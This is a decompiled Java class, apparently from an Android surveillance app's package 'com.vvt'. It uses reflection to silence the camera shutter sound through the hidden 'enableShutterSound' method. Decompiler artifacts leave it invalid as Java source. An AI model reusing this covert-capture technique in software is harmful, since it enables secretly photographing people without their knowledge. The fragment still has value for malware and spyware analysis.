package com.vvt.f;

import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class a
{
  private static final boolean a = com.vvt.ak.a.e;
  private static final boolean b = com.vvt.ak.a.a;
  
  public static void a(Camera paramCamera, int paramInt)
  {
    Object localObject1 = Camera.CameraInfo.class;
    Object localObject2 = "canDisableShutterSound";
    try
    {
      bool1 = a((Class)localObject1, (String)localObject2);
      if (bool1)
      {
        localObject1 = new android/hardware/Camera$CameraInfo;
        ((Camera.CameraInfo)localObject1).<init>();
        Camera.getCameraInfo(paramInt, (Camera.CameraInfo)localObject1);
        localObject2 = Camera.CameraInfo.class;
        Object localObject3 = "canDisableShutterSound";
        localObject2 = ((Class)localObject2).getDeclaredField((String)localObject3);
        boolean bool2 = true;
        ((Field)localObject2).setAccessible(bool2);
        localObject1 = ((Field)localObject2).get(localObject1);
        localObject1 = (Boolean)localObject1;
        bool1 = ((Boolean)localObject1).booleanValue();
        if (bool1)
        {
          localObject1 = Camera.class;
          localObject2 = "enableShutterSound";
          bool2 = true;
          localObject3 = new Class[bool2];
          Boolean localBoolean = null;
          Class localClass = Boolean.TYPE;
          localObject3[0] = localClass;
          localObject1 = ((Class)localObject1).getMethod((String)localObject2, (Class[])localObject3);
          if (localObject1 != null)
          {
            boolean bool3 = true;
            ((Method)localObject1).setAccessible(bool3);
            bool3 = true;
            localObject2 = new Object[bool3];
            bool2 = false;
            localObject3 = null;
            localBoolean = null;
            localBoolean = Boolean.valueOf(false);
            localObject2[0] = localBoolean;
            ((Method)localObject1).invoke(paramCamera, (Object[])localObject2);
            bool1 = b;
            if (!bool1) {}
          }
        }
      }
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool1 = a;
        if (!bool1) {}
      }
    }
  }
  
  private static boolean a(Class paramClass, String paramString)
  {
    try
    {
      paramClass.getDeclaredField(paramString);
      bool = true;
    }
    catch (NoSuchFieldException localNoSuchFieldException)
    {
      for (;;)
      {
        boolean bool = false;
      }
    }
    return bool;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/f/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */